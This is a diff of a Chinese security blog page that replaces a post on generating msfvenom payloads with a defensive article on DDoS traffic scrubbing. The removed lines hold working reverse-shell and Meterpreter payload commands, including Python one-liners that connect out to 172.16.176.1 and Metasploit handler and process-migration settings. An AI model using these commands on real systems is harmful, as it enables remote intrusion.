@@ -17,8 +17,8 @@ var _hmt = _hmt || [];
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="msfvenom生成payload, ssooking&#39;s blog">
-    <meta name="description" content="msfvenom重要参数查看payloads: msfvenom --list payloads查看支持的文件格式：msfvenom --help-formats查看payload所需参数：msfvenom -p xxx --payload">
+    <meta name="keywords" content="攻击流量的清洗, ssooking&#39;s blog">
+    <meta name="description" content="前言　　流量清洗是指在全部的网络流量中区分出正常流量和恶意流量，将恶意流量阻断和丢弃，而只将正常的流量交付给服务器。与其他的网络安全检测和防护手段类似，流量清洗也需要考虑漏报率和误报率的问题。通常，漏报率和误报率是一对矛盾，需要通过对检测和">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -26,7 +26,7 @@ var _hmt = _hmt || [];
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>msfvenom生成payload | ssooking&#39;s blog</title>
+    <title>攻击流量的清洗 | ssooking&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -267,13 +267,13 @@ var _hmt = _hmt || [];
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        msfvenom生成payload
+                        攻击流量的清洗
                     </div>
                 </div>
             </div>
@@ -384,16 +384,12 @@ var _hmt = _hmt || [];
             
             <div class="article-tag">
                 
-                <a href="/tags/metasploit/" target="_blank">
-                    <span class="chip bg-color">metasploit</span>
+                <a href="/tags/IDS/" target="_blank">
+                    <span class="chip bg-color">IDS</span>
                 </a>
                 
-                <a href="/tags/RAT/" target="_blank">
-                    <span class="chip bg-color">RAT</span>
-                </a>
-                
-                <a href="/tags/木马后门/" target="_blank">
-                    <span class="chip bg-color">木马后门</span>
+                <a href="/tags/DDOS/" target="_blank">
+                    <span class="chip bg-color">DDOS</span>
                 </a>
                 
             </div>
@@ -403,100 +399,52 @@ var _hmt = _hmt || [];
                 <span class="post-cate">
                     <i class="fa fa-bookmark fa-fw icon-category"></i>
                     
-                    <a href="/categories/攻防渗透/" class="post-category" target="_blank">
-                        攻防渗透
-                    </a>
-                    
-                    <a href="/categories/攻防渗透/神兵利器/" class="post-category" target="_blank">
-                        神兵利器
+                    <a href="/categories/安全建设/" class="post-category" target="_blank">
+                        安全建设
                     </a>
                     
                 </span>
                 
 
                 <span class="post-date">
-                    <i class="fa fa-clock-o fa-fw"></i>2016-11-15
+                    <i class="fa fa-clock-o fa-fw"></i>2017-06-16
                 </span>
             </div>
         </div>
         <hr>
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="msfvenom重要参数"><a href="#msfvenom重要参数" class="headerlink" title="msfvenom重要参数"></a>msfvenom重要参数</h1><p>查看payloads: <code>msfvenom --list payloads</code><br>查看支持的文件格式：<code>msfvenom --help-formats</code><br>查看<code>payload</code>所需参数：<code>msfvenom -p xxx --payload-options</code></p>
-<p>编码参数</p>
-<pre class=" language-bash"><code class="language-bash">-e x86/shikata_ga_nai -i 5 -b <span class="token string">"\x00"</span> //使用shikata_ga_nai编码器编码5次并去除空字符
-</code></pre>
-<h1 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h1><pre class=" language-bash"><code class="language-bash">windows/shell_bind_tcp
-windows/meterpreter/bind_tcp
-windows/meterpreter/reverse_tcp
-windows/x64/meterpreter/reverse_tcp
-linux/x86/shell_bind_tcp
-linux/x86/meterpreter_reverse_tcp
-</code></pre>
-<h2 id="System-Payloads"><a href="#System-Payloads" class="headerlink" title="System Payloads"></a>System Payloads</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f elf <span class="token operator">></span> shell.elf
-</code></pre>
-<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>messagebox Test</p>
-<pre class=" language-bash"><code class="language-bash">msfvenom -a x86 -p windows/messagebox TEXT<span class="token operator">=</span><span class="token string">"hello, it is a test"</span>
-</code></pre>
-<p>windows下生成32位/64位payload时需要注意。</p>
-<pre class=" language-bash"><code class="language-bash">msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe <span class="token operator">></span> shell.exe
-msfvenom -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe <span class="token operator">></span> shell.exe
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe <span class="token operator">></span> shell.exe
-</code></pre>
-<p>以<code>windows/meterpreter/reverse_tcp</code>为例，该payload默认为32位，也可使用<code>-a x86</code>选项指定。</p>
-<p>如果要生成64位，则payload为<code>windows/x64/meterpreter/reverse_tcp</code>。</p>
-<h3 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h3><p>nc正向连接</p>
-<pre class=" language-bash"><code class="language-bash">msfvenom -p windows/shell_hidden_bind_tcp rhost<span class="token operator">=</span>192.168.0.107 lport<span class="token operator">=</span>8956 -f exe<span class="token operator">></span> 1.exe      
-</code></pre>
-<p> nc反向连接，监听</p>
-<pre class=" language-bash"><code class="language-bash">msfvenom -p windows/shell_reverse_tcp lhost<span class="token operator">=</span>192.168.0.107 lport<span class="token operator">=</span>888 -f exe<span class="token operator">></span> 1.exe
-</code></pre>
-<h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p osx/x86/shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f macho <span class="token operator">></span> shell.macho
-</code></pre>
-<h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><pre class=" language-bash"><code class="language-bash">msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.apk
-</code></pre>
-<h2 id="Web-Payloads"><a href="#Web-Payloads" class="headerlink" title="Web Payloads"></a>Web Payloads</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p php/meterpreter_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.php
-<span class="token function">cat</span> shell.php <span class="token operator">|</span> pbcopy <span class="token operator">&amp;&amp;</span> <span class="token keyword">echo</span> <span class="token string">'&lt;?php '</span> <span class="token operator">|</span> <span class="token function">tr</span> -d <span class="token string">'\n'</span> <span class="token operator">></span> shell.php <span class="token operator">&amp;&amp;</span> pbpaste <span class="token operator">>></span> shell.php
-</code></pre>
-<h3 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f asp <span class="token operator">></span> shell.asp
-</code></pre>
-<h3 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.jsp
-</code></pre>
-<h3 id="war"><a href="#war" class="headerlink" title="war"></a>war</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f war <span class="token operator">></span> shell.war
-</code></pre>
-<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p cmd/unix/reverse_python LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.py
-msfvenom -a python -p python/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.py
-</code></pre>
-<p>正向shell</p>
-<pre class=" language-python"><code class="language-python">python<span class="token operator">/</span>python3 <span class="token operator">-</span>c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.176.1",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span>
-
-python<span class="token operator">/</span>python3 <span class="token operator">-</span>c <span class="token string">"exec(\"import socket, subprocess;s = socket.socket();s.connect(('172.16.176.1',9999))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"</span>
-</code></pre>
-<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p cmd/unix/reverse_bash LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.sh
-</code></pre>
-<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p cmd/unix/reverse_perl LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.pl
-</code></pre>
-<h1 id="MSF监听"><a href="#MSF监听" class="headerlink" title="MSF监听"></a>MSF监听</h1><pre class=" language-bash"><code class="language-bash">use exploit/multi/handler
-<span class="token keyword">set</span> PAYLOAD <span class="token operator">&lt;</span>Payload name<span class="token operator">></span>
-<span class="token keyword">set</span> RHOST <span class="token operator">&lt;</span>RHOST value<span class="token operator">></span>
-<span class="token keyword">set</span> RPORT <span class="token operator">&lt;</span>RPORT value<span class="token operator">></span>
-<span class="token keyword">set</span> LHOST <span class="token operator">&lt;</span>LHOST value<span class="token operator">></span>
-<span class="token keyword">set</span> LPORT <span class="token operator">&lt;</span>LPORT value<span class="token operator">></span>
-<span class="token keyword">set</span> ExitOnSession <span class="token boolean">false</span>
-exploit -j -z
-</code></pre>
-<p>其他设置</p>
-<p><code>AutoRunScript</code>：自动执行脚本<br>如：自动执行<code>post/windows/manage/migrate</code> 模块注入其他进程</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> AutoRunScript post/windows/manage/migrate
-</code></pre>
-<p>自动注入进程</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> prependmigrate <span class="token boolean">true</span>
-<span class="token keyword">set</span> prependmigrateProc svchost.exe
-</code></pre>
-<p>辅助配置</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> exitonsession <span class="token boolean">false</span> //可以让建立监听的端口继续保持侦听，可以接受多个session
-<span class="token keyword">set</span> stagerverifysslcert <span class="token boolean">false</span> //防止获取shell的时候出现的SSL_accept错误
-</code></pre>
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>　　流量清洗是指在全部的网络流量中区分出正常流量和恶意流量，将恶意流量阻断和丢弃，而只将正常的流量交付给服务器。与其他的网络安全检测和防护手段类似，流量清洗也需要考虑漏报率和误报率的问题。通常，漏报率和误报率是一对矛盾，需要通过对检测和防护规则的调整来进行平衡。</p>
+<p>​    如果流量清洗的漏报率太高，就会有大量的攻击请求穿透流量清洗设备，如果无法有效地减少攻击流量，也就达不到减轻服务器压力的效果；相反，如果误报率太高，就会出现大量的正常请求在清洗过程中被中断，严重影响正常的服务和业务运行。</p>
+<p>​    优秀的流量清洗设备，应该能够同时将误报率和漏报率降低到可以接受的程度，这样就能够在不影响网络或业务系统正常运行的情况下，最大限度地将恶意攻击流量从全部网络流量中去除。要达到这个目的，需要同时使用多种准确而高效的清洗技术，这些技术包括：</p>
+<ul>
+<li>IP信誉检查</li>
+<li>攻击特征匹配</li>
+<li>速度检查与限制</li>
+<li>TCP代理和验证</li>
+<li>协议完整性验证</li>
+<li>客户端真实性验证</li>
+</ul>
+<h2 id="IP信誉检查"><a href="#IP信誉检查" class="headerlink" title="IP信誉检查"></a>IP信誉检查</h2><p>　　IP信誉机制是指为互联网上的IP地址赋予一定的信誉值，那些过去或现在经常被作为僵尸主机发送垃圾邮件或发动拒绝服务攻击的IP地址会被赋予较低的信誉值，说明这些IP地址更有可能成为网络攻击的来源。</p>
+<p>　　IP信誉检查的极端情况就是IP黑名单机制，即如果数据包的来源存在于黑名单当发生分布式拒绝服务攻击时，流量清洗设备会对通过的网络流量进行IP信誉检查，在其内部的IP地址信誉库中查找每一个数据包来源的信誉值，并会优先丢弃信誉值低的IP地址所发来的数据包或建立的会话连接，以此保证信誉高的IP地址与服务器的正常通信。</p>
+<h2 id="攻击特征匹配"><a href="#攻击特征匹配" class="headerlink" title="攻击特征匹配"></a>攻击特征匹配</h2><p>　　在大多数情况下，发动分布式拒绝服务攻击需要借助攻击工具。为了提高发送请求的效率，<strong>攻击工具发出的数据包通常是由编写者伪造并固化到工具当中的</strong>，而不是在交互过程中产生的，因此一种攻击工具所发出的数据包载荷会具有一些特征。流量清洗设备可以<strong>将这些数据包载荷中的特征作为指纹</strong>，来识别工具发出的攻击流量。指纹识别可以分为静态指纹识别和动态指纹识别两种。</p>
+<p>​    静态指纹识别是指预先将多种攻击工具的指纹特征保存在流量清洗设备内部，设备将经过的网络数据包与内部的特征库进行比对，直接丢弃符合特征的数据包。</p>
+<p>​    动态指纹识别则需要清洗设备对流过的网络数据包进行学习，在学习到若干个数据包的载荷部分之后，将其指纹特征记录下来，后续命中这些指纹特征的数据包会被丢弃，而长期不被命中的指纹特征会逐渐老化直至消失。</p>
+<h2 id="速度检查与限制"><a href="#速度检查与限制" class="headerlink" title="速度检查与限制"></a>速度检查与限制</h2><p>　　一些攻击方法在数据包载荷上可能并不存在明显的特征，没有办法进行攻击特征匹配，但却在请求数据包发送的频率和速度上有着明显的异常。这些攻击方法可以通过速度检查与限制来进行清洗。</p>
+<p>​    例如，在受到<code>THC SSL DoS</code>攻击时，会在同一个SSL会话中多次进行加密密钥的重协商，而正常情况下是不会反复重协商加密密钥的。因此，当流量清洗设备进行统计时，如果发现SSL会话中密钥重协商的次数超过了特定的阈值，就可以直接中断这个会话并把来源加入黑名单中。</p>
+<p>​    再如，在受到Slowloris和慢速POST请求攻击时，客户端和服务器之间会以非常低的速率进行交互和数据传输。流量清洗设备在发现HTTP的请求长时间没有完成传输时，就可以将会话中断。此外，对于UDP洪水攻击等一些没有明显特征、仅通过大流量进行攻击的方法，可以通过限制流速的方式对其进行缓解。</p>
+<h2 id="TCP代理和验证"><a href="#TCP代理和验证" class="headerlink" title="TCP代理和验证"></a>TCP代理和验证</h2><p>　　SYN洪水攻击等攻击方式都是利用TCP协议的弱点，将被攻击目标的连接表占满，使其无法创建新的连接而达到拒绝服务攻击的目的。流量清洗设备可以通过TCP代理和验证的方法来缓解这种攻击造成的危害。</p>
+<p>​    在一个TCP SYN请求到达流量清洗设备后，设备并不将它交给后面的服务器，而是直接回复一个<code>SYN+ACK响应</code>，并等待客户端回复。如果SYN请求来自合法的用户，那么他会对SYN+ACK进行响应，这时流量清洗设备会代替用户与其保护之后，合法的用户和服务器之间就可以透过流量清洗设备，进行正常数据通信。对于用户来说整个过程是完全透明的，正常的交互没有受到任何影响。然后服务器建立起TCP连接，并将这个连接加入信任列表当中。而如果这个SYN请求来自攻击者，那么它通常不会对SYN+ACK进行应答，从而形成半开连接。这样流量清洗设备会暂时保留这个半开连接，并在经过短暂的超时时间之后丢弃这个连接</p>
+<p>　　相比于所保护的服务器，流量清洗设备对连接表操作进行了专门优化，能够处理极其庞大的连接请求数量，因此即使有非常多的SYN请求同时涌向清洗设备，清洗设备也能够处理。在这个过程中，由于清洗设备拦截在被保护的服务器之前，服务器并没有消耗任何的连接资源，因此保证了服务器的性能不受影响。</p>
+<p>​    流量清洗设备在作为TCP代理进行防护时，除了拦截半开连接外，还可以进行TCP协议的一些交互式验证。例如，在收到第一个SYN请求时，通过直接丢弃、发送RST包或发送错误序列号的ACK包的方式来中断连接过程，并检查客户端是否重新发起连接请求。通过这种验证，也可以识别并丢弃许多不合法的连接。</p>
+<h2 id="协议完整性验证"><a href="#协议完整性验证" class="headerlink" title="协议完整性验证"></a>协议完整性验证</h2><p>　　为了提高发送攻击请求的效率，大多数的攻击方法都会只发送攻击请求，而不接收服务器响应的数据，或者无法完全理解和处理响应数据。因此，如果能够对请求来源进行交互式验证，就可以检查请求来源协议实现的完整性。</p>
+<p>​        对于协议实现不完整的请求来源，通常可以将其作为攻击主机丢弃其发送的数据。在DNS解析的过程中，如果域名解析请求获得的响应数据中Flags字段的Truncated位被置位，通常客户端就会使用TCP 53端口重新发送域名解析请求。而攻击者使用的攻击工具由于不接收或不处理解析请求的响应数据，也就不会使用TCP 53端口进行重新连接。流量清洗设备可以利用这个区别来有效地区分合法用户与攻击者，拦截恶意的DNS攻击请求</p>
+<p>　　对于提供HTTP服务的Web服务器，也可以使用类似的方式进行协议完整性验证。例如，可以使用HTTP协议中的302重定向来验证请求的来源是否接收了响应数据并完整实现了HTTP协议的功能。HTTP的302状态码表示被请求的资源被临时转移，并会给出一个转移后的地址。正常的合法用户在接收到302重定向后会顺着跳转地址寻找对应的资源，而攻击者的攻击工具由于不接收或不处理响应数据，则不会进行跳转，因此攻击请求会被清洗设备拦截，Web服务器不会受到任何影响。</p>
+<h2 id="客户端真实性验证"><a href="#客户端真实性验证" class="headerlink" title="客户端真实性验证"></a>客户端真实性验证</h2><p>　　进行协议完整性验证能够清洗掉一部分简单的攻击工具所发送的攻击流量，但是，一些攻击工具在开发过程中使用了现成的协议库，这样就能够完整实现协议交互，通过协议完整性检验。对于这些攻击工具，需要使用客户端真实性验证技术进行攻击流量清洗。</p>
+<p>​    客户端真实性验证是指对客户端程序进行挑战–应答式的交互验证，检查客户端能否完成特定的功能，以此来确定请求数据是否来自真实的客户端。对基于页面的Web服务，可以通过检查客户端是否支持JavaScript来验证请求是否来自真实的浏览器客户端。<strong>当收到HTTP请求时，流量清洗设备会使用JavaScript等脚本语言发送一条简单的运算操作。</strong>如果请求是由真实的浏览器发出的，那么浏览器会进行正确运算并返回结果，流量清洗设备进行结果验证后就会让浏览器进行正确运算并返回结果，流量清洗设备进行结果验证后就会让浏览器跳转到Web服务器上真正的资源位置，不会影响正常用户的访问；而如果请求是由攻击者通过攻击工具发送的，由于大部分工具没有实现JavaScript的解析和执行功能，因而不能返回正确的运算结果，流量清洗设备会直接丢弃这些请求，而不会给出跳转到Web服务器的连接，因此Web服务器不会受到影响</p>
+<p>　　当然，攻击者也可以牺牲工具的一部分攻击效率，并在工具中加入JavaScript的解析和执行功能，以便通过JavaScript验证。这时，则需要使用验证码进行人机识别。验证码的全称是“全自动区分计算机和人类的图灵测试”<code>（Completely Automated Public Turing test to tell Computers and Humans Apart，CAPTCHA）</code>，这是一种用于分辨人与计算机的反向图灵测试。</p>
+<h2 id="图灵测试和反向图灵测试"><a href="#图灵测试和反向图灵测试" class="headerlink" title="图灵测试和反向图灵测试"></a>图灵测试和反向图灵测试</h2><p>　　图灵测试（又称<code>图灵判断</code>）是图灵提出的一个关于机器人的著名判断原则。图灵测试是一种测试机器是不是具备人类智能的方法：被测试的包括一个人和一台声称自己有人类智力的机器。测试人在与被测试者（一个人和一台机器）隔开的情况下，通过一些装置（如键盘）向被测试者随意提问。问过一些问题后，如果测试人不能确认被测试者的答复中哪个是人、哪个是机器的回答，那么这台机器就通过了测试，并被认为具有人类智能。目前，还没有一台机器能够通过图灵测试。可以看出，图灵测试是由人来出题考验机器，其目的是让出题人无法分辨给出答案的是人还是机器；而验证码与这个过程相反，是由机器来自动生成题目，其目的是让出题人能够有效地分辨给出答案的是不是真实的人。因此，验证码通常被认为是一种反向图灵测试。常见的验证码是让用户输入一个扭曲变形的图片上所显示的文字。对于真实的人类用户来说，通常能够比较容易地识别出这些文字，给出正确的识别结果，从而通过测试并继续进行访问</p>
+<p>　　而对于计算机来说，想要识别验证码中的文字则相当困难。对于无法给出验证码正确识别结果的请求，流量清洗设备会直接丢弃，从而保护Web服务器不受影响误区：DDoS的云端清洗服务和本地缓解设备可以相互替代。DDoS其实是多种攻击的统称，不同的攻击也许要不同的缓解方法。通常，云端清洗服务主要采用稀释和分流的方法，擅长应对流量型DDoS攻击；而本地缓解设备能够处理的流量较小，更容易组合使用多种清洗技术，适合对抗系统资源消耗型和应用资源消耗型DDoS攻击。用户应该根据自己的业务特点和主要威胁，选择适合自身的解决方案。</p>
 
             </div>
             <hr>
@@ -635,7 +583,7 @@ exploit -j -z
                     <span class="reprint-tip">转载请注明: </span>
                     <a href="https://ssooking.github.io" class="b-link-green">ssooking's blog</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2016/11/15/msfvenom-sheng-cheng-payload/" class="b-link-green">msfvenom生成payload</a>
+                    <a href="/gong-ji-liu-liang-de-qing-xi/" class="b-link-green">攻击流量的清洗</a>
                 </p>
             </div>
         </div>
@@ -657,27 +605,28 @@ exploit -j -z
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">上一篇</div>
             <div class="card">
-                <a href="/2017/06/16/gong-ji-liu-liang-de-qing-xi/">
+                <a href="/li-yong-beef-rest-api-zi-dong-hua-kong-zhi-jiang-shi-zhu-ji/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="攻击流量的清洗">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="利用BeEF REST API自动化控制僵尸主机">
                         
-                        <span class="card-title">攻击流量的清洗</span>
+                        <span class="card-title">利用BeEF REST API自动化控制僵尸主机</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">前言　　流量清洗是指在全部的网络流量中区分出正常流量和恶意流量，将恶意流量阻断和丢弃，而只将正常的流量交付给服务器。与其他的网络安全检测和防护手段类似，流量清洗也需要考虑漏报率和误报率的问题。通常，漏报率和误报率是一对矛盾，需要通过对检测和</div>
+                    <div class="summary">利用BeEF REST API自动化控制僵尸主机
+一. 前言 　　关于BeEF，不再多介绍，它的强大毋庸置疑，利用它我们可以做很多事情。最近的一些实验，需要用beef批量自动进行控制，发现网上也没有过多关于这方面内容的介绍，于是学习了一下它</div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2017-06-16
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2017-06-25
                         </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/安全建设/" class="post-category" target="_blank">
-                                    安全建设
+                            <a href="/categories/神兵利器/" class="post-category" target="_blank">
+                                    神兵利器
                                 </a>
                             
                             
@@ -687,12 +636,12 @@ exploit -j -z
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/DDOS/" target="_blank">
-                        <span class="chip bg-color">DDOS</span>
+                    <a href="/tags/BeEF/" target="_blank">
+                        <span class="chip bg-color">BeEF</span>
                     </a>
                     
-                    <a href="/tags/IDS/" target="_blank">
-                        <span class="chip bg-color">IDS</span>
+                    <a href="/tags/XSS/" target="_blank">
+                        <span class="chip bg-color">XSS</span>
                     </a>
                     
                 </div>
@@ -702,9 +651,9 @@ exploit -j -z
         
         
         <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">本篇</div>
+            <div class="article-badge right-badge text-color">下一篇</div>
             <div class="card">
-                <a href="/2016/11/15/msfvenom-sheng-cheng-payload/">
+                <a href="/msfvenom-sheng-cheng-payload/">
                     <div class="card-image">
                         
                         
@@ -735,7 +684,6 @@ exploit -j -z
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
